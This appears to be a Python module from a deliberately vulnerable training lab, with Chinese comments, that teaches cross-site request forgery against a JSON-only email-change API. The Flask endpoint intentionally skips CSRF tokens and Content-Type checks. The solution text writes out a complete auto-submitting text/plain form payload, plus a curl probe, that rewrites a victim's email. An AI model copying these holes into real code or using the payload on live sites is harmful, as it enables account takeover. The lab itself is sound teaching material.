"""JSON 接口的 CSRF —— 表单发不出 JSON，但可以是"看起来像 JSON 的表单"。

跟 `csrf/password_change` 那道题的区别在**攻击手法**：

  · 那道题：普通表单 POST，浏览器照发，服务端照收
  · 这一题：接口只收 JSON，而 HTML 表单发不出 `application/json`……

      ……但表单能发 `text/plain`，而 `text/plain` 的请求体是**原样拼接、不做转义**的。
      所以只要精心设计字段名，拼出来的整段 body 正好就是一段合法 JSON。

这道题顺带教一个更常见的错误：接口**不看 Content-Type 就解析 JSON**。
"""

import json
import sqlite3
from urllib.parse import urlsplit

from vuln4all import Vuln, jsonify, redirect, render_template, request, session, url_for

DB_NAME = "portal.db"

#: 攻击者想让受害者改成的邮箱。
EVIL_EMAIL = "attacker@evil.example"

GOAL = "从一个不属于本站的页面发起了改邮箱请求（这就是 CSRF）"

USERS = {
    "bob": ("bob123", "bob@corp.example"),
    "carol": ("carol123", "carol@corp.example"),
}


class JsonApi(Vuln):
    info = {
        "name": "JSON 接口的 CSRF",
        "author": ["guaidao2"],
        "cwe": "CWE-352",
        "owasp": "A01:2021 - Broken Access Control",
        "difficulty": "进阶",
        "description": (
            "改邮箱的接口只收 JSON，而且没有 CSRF token。"
            "很多人以为「只收 JSON」本身就是一种防护 —— 因为 HTML 表单发不出 "
            "application/json。这一题就是为了说明那个想法错在哪。"
        ),
        "hint": (
            "先登进个人中心，手动改一次邮箱，用开发者工具的 Network 面板"
            "看看那个请求长什么样：请求体是什么、Content-Type 是什么。\n"
            "然后想：HTML 表单能发的 Content-Type 有哪三种？其中哪一种"
            "**不会**对字段名和值做任何转义？\n"
            "最后：如果你把 JSON 的开头和结尾分别塞进 `name` 和 `value`，"
            "拼出来的 body 会长什么样？"
        ),
        "solution": (
            "一、先确认服务端的行为。它是不是「不看 Content-Type 就解析 JSON」？\n"
            "   用 curl 试一下就知道了：\n"
            "   curl -X POST -H 'Content-Type: text/plain' \\\n"
            "        --data-raw '{\"email\":\"x@y\"}' \\\n"
            "        -b 'session=...' 'http://<靶场>/v/csrf/json_api/api/email'\n"
            "   如果照样改掉了，那它就只看 body。\n\n"
            "二、构造攻击页面。表单用 enctype=\"text/plain\"：\n\n"
            "   <form action=\"<改邮箱接口>\" method=\"POST\" enctype=\"text/plain\">\n"
            "     <input name='{\"email\":\"attacker@evil.example\",\"ignore\":\"' value='\"}'>\n"
            "   </form>\n"
            "   <script>document.forms[0].submit()</script>\n\n"
            "   text/plain 的表单编码规则是 name + '=' + value，**不做任何转义**。\n"
            "   所以拼出来的 body 正好是：\n"
            "     {\"email\":\"attacker@evil.example\",\"ignore\":\"=\"}\n"
            "   这是一段合法 JSON —— 中间的等号变成了 ignore 字段的值。\n\n"
            "三、把受害者引到这个页面（或者自己打开它）就能改了。"
        ),
        "refs": [
            "https://owasp.org/www-community/attacks/csrf",
            "https://portswigger.net/web-security/csrf/bypassing-token-validation",
        ],
        # 攻击者站点挂在别处，方便演示"请求来自另一个页面"
        "mounts": {"attacker": {"path": "/evil-json"}},
    }

    # ------------------------------------------------------------ 生命周期

    def setup(self, ctx):
        con = sqlite3.connect(str(ctx.workspace / DB_NAME))
        con.executescript(
            """
            CREATE TABLE accounts (
                username TEXT PRIMARY KEY,
                password TEXT NOT NULL,
                email    TEXT NOT NULL
            );
            INSERT INTO accounts (username, password, email) VALUES
                ('bob',   'bob123',   'bob@corp.example'),
                ('carol', 'carol123', 'carol@corp.example');
            """
        )
        con.commit()
        con.close()

    # ---------------------------------------------------------------- 应用

    def create_app(self, ctx):
        app = ctx.flask(__name__)
        evil = ctx.flask(__name__, mount="attacker")
        db_path = str(ctx.workspace / DB_NAME)

        def email_of(username):
            con = sqlite3.connect(db_path)
            try:
                row = con.execute(
                    "SELECT email FROM accounts WHERE username = ?", (username,)
                ).fetchone()
                return row[0] if row else None
            finally:
                con.close()

        def set_email(username, email):
            con = sqlite3.connect(db_path)
            try:
                con.execute(
                    "UPDATE accounts SET email = ? WHERE username = ?", (email, username)
                )
                con.commit()
            finally:
                con.close()

        # ------------------------------------------------------ 受害者站

        @app.route("/")
        def index():
            if session.get("user"):
                return redirect(url_for("profile"))
            return render_template("login.html", error=None)

        @app.route("/login", methods=["POST"])
        def login():
            user = request.form.get("user", "")
            password = request.form.get("password", "")
            record = USERS.get(user)
            if record and record[0] == password:
                session["user"] = user
                return redirect(url_for("profile"))
            return render_template("login.html", error="用户名或密码不对")

        @app.route("/profile")
        def profile():
            if not session.get("user"):
                return redirect(url_for("index"))
            return render_template(
                "profile.html",
                user=session["user"],
                email=email_of(session["user"]) or "",
                api=url_for("api_email"),
                evil_url=ctx.url("attacker", "/"),
            )

        @app.route("/api/email", methods=["POST"])
        def api_email():
            # ↓↓↓ 洞 1：只检查登录，没有 CSRF token ↓↓↓
            if not session.get("user"):
                return jsonify({"error": "未登录"}), 401

            # ↓↓↓ 洞 2：不看 Content-Type，直接把请求体当 JSON 解析 ↓↓↓
            raw = request.get_data(as_text=True) or ""
            try:
                payload = json.loads(raw)
            except ValueError:
                return jsonify({"error": "请求体不是合法 JSON"}), 400
            # ↑↑↑ 正确做法：先要求 request.is_json（即 Content-Type 是 application/json），
            #     再加 CSRF token 校验 ↑↑↑

            if not isinstance(payload, dict):
                return jsonify({"error": "请求体应该是一个 JSON 对象"}), 400

            new_email = str(payload.get("email", "")).strip()
            if not new_email:
                return jsonify({"error": "email 不能为空"}), 400

            set_email(session["user"], new_email)

            # 进度判定：这次请求是不是从别的页面发起的？
            # 跟另一道 CSRF 题同一个判法 —— 必须要求**正面证据**：
            # 没有 Referer 说明对面不是浏览器（curl、脚本），那不叫跨站。
            referer = request.headers.get("Referer", "").strip()
            if referer and not urlsplit(referer).path.startswith(ctx.url("", "/")):
                ctx.progress.mark(GOAL)

            return jsonify({"ok": True, "email": new_email})

        @app.route("/logout")
        def logout():
            session.clear()
            return redirect(url_for("index"))

        # ------------------------------------------------------ 攻击者站

        @evil.route("/")
        def evil_index():
            body = '{"email":"%s","ignore":"' % EVIL_EMAIL
            return render_template(
                "evil_json.html",
                target=ctx.url("", "/api/email"),
                victim_url=ctx.url("", "/profile"),
                evil_email=EVIL_EMAIL,
                field_name=body,
            )

        return {"": app, "attacker": evil}

    # ---------------------------------------------------------------- 进度

    def check(self, ctx):
        return {GOAL: ctx.progress.achieved(GOAL)}
